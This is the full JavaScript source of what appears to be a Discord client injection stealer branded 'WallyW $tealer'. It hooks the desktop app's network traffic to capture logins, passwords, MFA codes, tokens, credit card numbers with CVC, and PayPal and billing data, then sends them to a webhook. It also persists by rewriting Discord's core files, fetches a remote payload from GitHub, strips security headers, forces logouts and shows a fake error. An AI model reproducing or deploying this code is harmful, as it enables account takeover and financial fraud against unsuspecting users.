// WallyW ExE - Injection Clean.

const { BrowserWindow: BrowserWindow, session: session } = require("electron"),
    { execSync } = require("child_process"),
    { dialog } = require("electron"),
    { parse: parse } = require("querystring"),
    fs = require("fs"),
    os = require("os"),
    https = require("https"),
    path = require("path");

let WEBHOOK = "%WEBHOOK_URL%";

let [
    BACKUPCODES_SCRIPT,
    LOGOUT_SCRIPT,
    TOKEN_SCRIPT,
    INJECT_URL,
    BADGES,
    EMAIL,
    PASSWORD
] = [
        `const elements = document.querySelectorAll('span[class^="code_"]');let p = [];elements.forEach((element, index) => {const code = element.textContent;p.push(code);});p;`,
        'window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();',
        "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;",
        "https://raw.githubusercontent.com/69WallyW69/dwad2r1f21faawa/main/index.js",
        {
            _nitro: [
                "<:WallyWBoost_1:1270729934708539452>",
                "<:WallyWBoost_2:1270729936063303813>",
                "<:WallyWBoost_3:1270729937334046824>",
                "<:WallyWBoost_4:1270729939116621835>",
                "<:WallyWBoost_5:1270729941172097087>",
                "<:WallyWBoost_6:1270729942870659225>",
                "<:WallyWBoost_7:1270729944988909719>",
                "<:WallyWBoost_8:1270729946679087195>",
                "<:WallyWBoost_9:1270729948763652182>",
            ],
            _discord_emloyee: {
                value: 1,
                emoji: "<:WallyW_Discordstaff:1270725405917057128>",
                rare: true,
            },
            _partnered_server_owner: {
                value: 2,
                emoji: "<:WallyW_Partner:1270725650226876459>",
                rare: true,
            },
            _hypeSquad_events: {
                value: 4,
                emoji: "<:WallyW_HypeEvents:1270725883467923526>",
                rare: true,
            },
            _bug_hunter_level_1: {
                value: 8,
                emoji: "<:WallyW_BugHunterNormal:1270726107259338927>",
                rare: true,
            },
            _house_bravery: {
                value: 64,
                emoji: "<:WallyW_Bravery:1270727244138025000>",
                rare: false,
            },
            _house_brilliance: {
                value: 128,
                emoji: "<:WallyW_Brilliance:1270727620803297374>",
                rare: false,
            },
            _house_balance: {
                value: 256,
                emoji: "<:WallyW_Balance:1270727840228311130>",
                rare: false,
            },
            _early_supporter: {
                value: 512,
                emoji: "<:WallyW_EarlySupporter:1270726282740633661>",
                rare: true,
            },
            _bug_hunter_level_2: {
                value: 16384,
                emoji: "<:WallyW_BugHunterMax:1270726634915237888>",
                rare: true,
            },
            _early_bot_developer: {
                value: 131072,
                emoji: "<:WallyW_BotDev:1270726831770832937>",
                rare: true,
            },
            _certified_moderator: {
                value: 262144,
                emoji: "<:WallyW_Moderator:1270728086396338198>",
                rare: true,
            },
            _active_developer: {
                value: 4194304,
                emoji: "<:WallyW_Active_Developer:1270728269603536957>",
                rare: true,
            },
        },
        "",
        ""
    ];

const request = async (method, url, headers = {}, data = null) => {
    try {
        return new Promise((resolve, reject) => {
            let object = new URL(url),
                options = {
                    protocol: object.protocol,
                    hostname: object.hostname,
                    path: object.pathname + object.search,
                    method: method.toUpperCase(),
                    headers: {
                        ...headers,
                        "Access-Control-Allow-Origin": "*"
                    }
                };
            let req = https.request(options, (res) => {
                let resd = '';
                res.on('data', (chunk) => resd += chunk);
                res.on('end', () => resolve(resd));
            });
            req.on('error', (err) => reject(err));
            if (data) req.write(data);
            req.end();
        });
    } catch (err) {
        return Promise.reject(err);
    }
};

const notify = async (ctx, token, acc) => {
    let nitro = getNitro(await fProfile(token)),
        badges = await getBadges(acc.flags),
        billing = await getBilling(token),
        friends = await getFriends(token)
    

    ctx.embeds[0].title = ``;
    ctx.embeds[0].fields.unshift({
        name: `<:WallyW_Token:1270729277037346828> Token:`,
        value: `\`${token}\`\n[<:WallyW_Preview:1270736421199548466> Click here to copy!](https://waaly.xyz/copy?text=${token})`,
        inline: false
    })

    ctx.embeds[0].thumbnail = {
        url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
    };

    ctx.embeds[0].fields.push(
        { name: "<:WallyW_Event:1270736055812751499> Badges:", value: badges, inline: true },
        { name: "<:WallyW_Nitrotype:1270729274168705177> Nitro Type:", value: nitro, inline: true },
        { name: "<:WallyW_Member:1270735566056591531> Billing:", value: billing, inline: true },
        { name: "<:WallyW_Ip:1270729267067490438> IP:", value: `\`${JSON.parse(await getNetwork()).ip}\``, inline: true },
        { name: "<:WallyW_Injection:1270735567813869609>  | Injected Path:", value: `\`\`\`${__dirname.toString().trim().replace(/\\/g, "/")}\`\`\``, inline: false },
    );

    ctx.embeds.push(
        { title: `<:WallyW_List:1270729268988739635> UHQ Friends`, description: friends },
    );

    ctx.embeds.forEach((e) => {
        e.color = 0x2b2d31;
        e.author = {
            name: `${acc.username} | ${acc.id}`,
            icon_url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.png`,
        };
        e.footer = {
            text: 'WallyW $tealer | @t.me/wm4rket',
            icon_url: "https://cdn.discordapp.com/attachments/1233084065280692264/1273676077469798451/wallywlogo.png?ex=66c02388&is=66bed208&hm=83f8acc49e30aed2e31893b6ef18096dbd4c7bdb24247c43e9df0ebdbb2ed768&"
        };
    });

    try {
        await request("POST", WEBHOOK, {
            "Content-Type": "application/json"
        }, JSON.stringify(ctx));
    } catch (error) {
        console.error("Error sending request to webhook:", error.message);
    }
};


const execScript = async (s) =>
    await BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(s, !0);
    dialog.showErrorBox("Ops!", "An internal error occurred in the Discord API.");

const fetch = async (e, h) =>
    JSON.parse(await request("GET", `${[
        'https://discordapp.com/api',
        'https://discord.com/api',
        'https://canary.discord.com/api',
        'https://ptb.discord.com/api'
    ][Math.floor(Math.random() * 4)]}/v9/users/${e}`, { ...h }));

const fAccount = async (authorization) =>
    await fetch("@me", { authorization });

const fProfile = async (authorization) =>
    await fetch(`${Buffer.from(authorization.split(".")[0], "base64").toString("binary")}/profile`, { authorization });

const fFriends = async (authorization) =>
    await fetch("@me/relationships", { authorization });

const fServers = async (authorization) =>
    await fetch("@me/guilds?with_counts=true", { authorization });

const fBilling = async (authorization) =>
    await fetch("@me/billing/payment-sources", { authorization });

const getNetwork = async () =>
    await request("GET", "https://api.ipify.org/?format=json", {
        "Content-Type": "application/json"
    });

const getBadges = (f) =>
    Object.keys(BADGES)
        .reduce((s, h) => BADGES.hasOwnProperty(h)
            && (f & BADGES[h].value) === BADGES[h].value
            ? `${s}${BADGES[h].emoji} `
            : s, "",
        ) || "`No Badges`";

const getRareBadges = (f) =>
    Object.keys(BADGES)
        .reduce((b, e) => BADGES.hasOwnProperty(e)
            && (f & BADGES[e].value) === BADGES[e].value
            && BADGES[e].rare
            ? `${b}${BADGES[e].emoji} `
            : b, "",
        );

const getBilling = async (t) =>
    (await fBilling(t))
        .filter((x) => !x.invalid)
        .map((x) => x.type === 1
            ? "<:WallyW_BlackCard:1270728933175857243>"
            : x.type === 2
                ? "<:WallyW_Paypal:1270728573459890247>"
                : "",
        ).join("") || "`None`";

const getFriends = async (s) =>
    (await fFriends(s))
        .filter((user) => user.type === 1)
        .reduce((r, a) => ((b) => b
        ? (r || "") + `${b} | \`${a.user.username}\`\n`
            : r)(getRareBadges(a.user.public_flags)),
            "",
        ) || "<:WallyW_Empty:1270729264635052043> *Empty.*";



const getDate = (a, b) => new Date(a).setMonth(a.getMonth() + b);

const getNitro = (u) => {
    let { premium_type, premium_guild_since } = u,
        x = "<:WallyW_NitroBadge:1270730341526798387>";
    switch (premium_type) {
        default:
            return "`No Nitro`";
        case 1:
            return x;
        case 2:
            if (!premium_guild_since) return x;
            let m = [2, 3, 6, 9, 12, 15, 18, 24],
                rem = 0;
            for (let i = 0; i < m.length; i++)
                if (Math.round((getDate(new Date(premium_guild_since), m[i]) - new Date()) / 86400000) > 0) {
                    rem = i;
                    break;
                }
            return `${x} ${BADGES._nitro[rem]}`;
    }
};

const cruise = async (type, mail, pass, res, req, act) => {
    let info;
    let msg;
    let token;
    switch (type) {
        case 'LOGIN_USER':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mail:1270729270938964029> Mail:", value: `\`${mail}\``, inline: true },
                        { name: "<:WallyW_Mfa:1270729272570548244> Pass:", value: `\`${pass}\``, inline: true },
                    ],
                }],
            };
            if (req.code !== undefined) {
                msg.embeds[0].fields.push(
                    { name: "<:WallyW_Mfa:1270729272570548244> Used Code:", value: `\`${req.code}\``, inline: true }
                );
            }
            notify(msg, res.token, info);
            break;
        case 'USERNAME_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mail:1270729270938964029> New Username:", value: `\`${req.username}\``, inline: true, },
                        { name: "<:WallyW_Mfa:1270729272570548244> Pass:", value: `\`${req.password}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'EMAIL_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mail:1270729270938964029> Mail:", value: `\`${mail}\``, inline: true },
                        { name: "<:WallyW_Mfa:1270729272570548244> Pass:", value: `\`${pass}\``, inline: true },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'PASSWORD_CHANGED':
            info = await fAccount(res.token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mfa:1270729272570548244> New Pass:", value: `\`${req.new_password}\``, inline: true, },
                        { name: "<:WallyW_Mfa:1270729272570548244> Old Pass:", value: `\`${req.password}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, res.token, info);
            break;
        case 'CREDITCARD_ADDED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "Number", value: `\`${req["card[number]"]}\``, inline: true },
                        { name: "CVC", value: `\`${req["card[cvc]"]}\``, inline: true },
                        { name: "Expiration", value: `\`${req["card[exp_month]"]}/${req["card[exp_year]"]}\``, inline: true, },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        case 'PAYPAL_ADDED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mail:1270729270938964029> Mail:", value: `\`${info.email}\``, inline: true },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        case 'INJECTED':
            token = res;
            info = await fAccount(token);
            msg = {
                title: act,
                embeds: [{
                    fields: [
                        { name: "<:WallyW_Mail:1270729270938964029> Mail:", value: `\`${info.email}\``, inline: true },
                    ],
                }],
            };
            notify(msg, token, info);
            break;
        default:
    }
}

const DISCORD_PATH = (function () {
    const app = process.argv[0].split(path.sep).slice(0, -1).join(path.sep);
    let resource;
    if (process.platform === "win32") resource = path.join(app, "resources");
    else if (process.platform === "darwin")
        resource = path.join(app, "Contents", "Resources");
    if (fs.existsSync(resource)) return { resource, app };
    return { undefined, undefined };
})();

async function UPDATE_CHECKING() {
    let i = "initiation";
    const { resource, app } = DISCORD_PATH;
    if (resource === undefined || app === undefined) return;
    let p = path.join(resource, "app");
    if (!fs.existsSync(p)) fs.mkdirSync(p);
    if (fs.existsSync(path.join(p, "package.json")))
        fs.unlinkSync(path.join(p, "package.json"));
    if (fs.existsSync(path.join(p, "index.js")))
        fs.unlinkSync(path.join(p, "index.js"));
    if (process.platform === "win32" || process.platform === "darwin") {
        fs.writeFileSync(
            path.join(p, "package.json"),
            JSON.stringify({ name: "discord", main: "index.js" }, null, 4),
        );
        fs.writeFileSync(
            path.join(p, "index.js"),
            `const fs = require('fs'), https = require('https');\nconst indexJs = '${`${app}\\modules\\${fs.readdirSync(`${app}\\modules\\`).filter((x) => /discord_desktop_core-+?/.test(x))[0]}\\discord_desktop_core\\index.js`}';\nconst bdPath = '${path.join(process.env.APPDATA, "\\betterdiscord\\data\\betterdiscord.asar")}';\nconst K4ITRUN = fs.statSync(indexJs).size\nfs.readFileSync(indexJs, 'utf8', (err, data) => {\n    if (K4ITRUN < 20000 || data === "module.exports = require('./core.asar')")\n        init();\n})\nasync function init() {\n    https.get('${INJECT_URL}', (res) => {\n        const file = fs.createWriteStream(indexJs);\n        res.replace('%WEBHOOK%', '${WEBHOOK}')\n        res.pipe(file);\n        file.on('finish', () => {\n            file.close();\n        });\n        \n    }).on("error", (err) => {\n        setTimeout(init(), 10000);\n    });\n}\nrequire('${path.join(resource, "app.asar")}')\nif (fs.existsSync(bdPath)) require(bdPath);`.replace(/\\/g, "\\\\")
        );
    }
    if (!fs.existsSync(path.join(__dirname, i))) return;
    else fs.rmdirSync(path.join(__dirname, i));
    if (!(await execScript(TOKEN_SCRIPT))) return;
    cruise(
        "INJECTED",
        null,
        null,
        (await execScript(TOKEN_SCRIPT)) ?? "",
        null,
        `DISCORD INJECTED`,
    );
    execScript(LOGOUT_SCRIPT);
}

session.defaultSession.webRequest.onBeforeRequest(
    {
        urls: [
            "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
            "https://*.discord.com/api/v*/applications/detectable",
            "https://discord.com/api/v*/applications/detectable",
            "https://*.discord.com/api/v*/users/@me/library",
            "https://discord.com/api/v*/users/@me/library",
            "wss://remote-auth-gateway.discord.gg/*",
            "https://discord.com/api/v*/auth/sessions",
            "https://*.discord.com/api/v*/auth/sessions",
            "https://discordapp.com/api/v*/auth/sessions",
        ],
    },
    (d, callback) => {
        if (!fs.existsSync(`${__dirname}/Discord`))
            fs.mkdirSync(`${__dirname}/Discord`);
        if (!fs.existsSync(`${__dirname}/Discord/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`,)) {
                fs.writeFileSync(`${__dirname}/Discord/${WEBHOOK.split("/")[WEBHOOK.split("/").length - 1]}.txt`, WEBHOOK,);
                execScript(LOGOUT_SCRIPT);
        }
        if (d.url.startsWith("wss://remote-auth-gateway") || d.url.endsWith("auth/sessions"))
            callback({ cancel: true });
        else
            callback({ cancel: false });
        UPDATE_CHECKING();
    },
);

session.defaultSession.webRequest.onHeadersReceived((a, callback) => {
    delete a.responseHeaders["content-security-policy"];
    delete a.responseHeaders["content-security-policy-report-only"];
    callback({
        responseHeaders: {
            ...a.responseHeaders,
            "Access-Control-Allow-Headers": "*",
        },
    });
});

session.defaultSession.webRequest.onCompleted(
    {
        urls: [
            "https://discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://discordapp.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://*.discord.com/api/v*/users/@me/billing/paypal/billing-agreement-tokens",
            "https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts",
            "https://api.stripe.com/v*/tokens",
        ],
    },
    async (a, callback) => {
        let data;
        try {
            data = parse(Buffer.from(a.uploadData[0].bytes).toString());
        } catch (err) {
            data = parse(decodeURIComponent(a.uploadData[0].bytes.toString()));
        }
        let authorization = (await execScript(TOKEN_SCRIPT)) ?? "";
        if (a.method != "POST") return;
        if (a.statusCode !== 200 && a.statusCode !== 202) return;
        if (a.url.endsWith("/paypal_accounts")) {
            cruise(
                "PAYPAL_ADDED",
                null,
                null,
                authorization,
                null,
                `PAYPAL ADDED`,
            );
        } else if (a.url.endsWith("/tokens")) {
            cruise(
                "CREDITCARD_ADDED",
                null,
                null,
                authorization,
                data,
                `CREDITCARD ADDED`,
            );
        }
    },
);

const CREATE_WINDOW_CLIENT = (win) => {
    if (!win.getAllWindows()[0]) return;
    win.getAllWindows()[0].webContents.debugger.attach("1.3");
    win.getAllWindows()[0].webContents.debugger.on("message", async (_, m, p) => {
        if (m !== "Network.responseReceived") return;
        if (!["/auth/login", "/auth/register", "/mfa/totp", "/users/@me",].some((url) => p.response.url.endsWith(url))) return;
        if (p.response.status !== 200 && p.response.status !== 202) return;
        let RESPONSE_DATA = JSON.parse(
            (
                await win.getAllWindows()[0].webContents.debugger.sendCommand(
                    "Network.getResponseBody",
                    { requestId: p.requestId },
                )
            ).body,
        ),
            REQUEST_DATA = JSON.parse(
                (
                    await win.getAllWindows()[0].webContents.debugger.sendCommand(
                        "Network.getRequestPostData",
                        { requestId: p.requestId },
                    )
                ).postData,
            );
        if (p.response.url.endsWith("/login")) {
            if (!RESPONSE_DATA.token) {
                EMAIL = REQUEST_DATA.login;
                PASSWORD = REQUEST_DATA.password;
                return;
            }
            cruise(
                "LOGIN_USER",
                REQUEST_DATA.login,
                REQUEST_DATA.password,
                RESPONSE_DATA,
                REQUEST_DATA,
                "LOGGED IN",
            );
        } else if (p.response.url.endsWith("/register")) {
            cruise(
                "LOGIN_USER",
                REQUEST_DATA.email,
                REQUEST_DATA.password,
                RESPONSE_DATA,
                REQUEST_DATA,
                "SIGNED UP",
            );
        } else if (p.response.url.endsWith("/totp")) {
            cruise(
                "LOGIN_USER",
                EMAIL,
                PASSWORD,
                RESPONSE_DATA,
                REQUEST_DATA,
                "LOGGED IN WITH MFA-2",
            );
        } else if (p.response.url.endsWith("/@me")) {
            if (!REQUEST_DATA.password) return;
            if (REQUEST_DATA.email)
                cruise(
                    "EMAIL_CHANGED",
                    REQUEST_DATA.email,
                    REQUEST_DATA.password,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED EMAIL`,
                );
            if (REQUEST_DATA.new_password)
                cruise(
                    "PASSWORD_CHANGED",
                    null,
                    null,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED PASSWORD`,
                );
            if (REQUEST_DATA.username)
                cruise(
                    "USERNAME_CHANGED",
                    null,
                    null,
                    RESPONSE_DATA,
                    REQUEST_DATA,
                    `CHANGED USERNAME`,
                );
        }
    },
    );
    win.getAllWindows()[0].webContents.debugger.sendCommand(
        "Network.enable",
    );
    win.getAllWindows()[0].on(
        "closed", () => CREATE_WINDOW_CLIENT(BrowserWindow)
    );
};

CREATE_WINDOW_CLIENT(BrowserWindow); // INIT

module.exports = require("./core.asar");
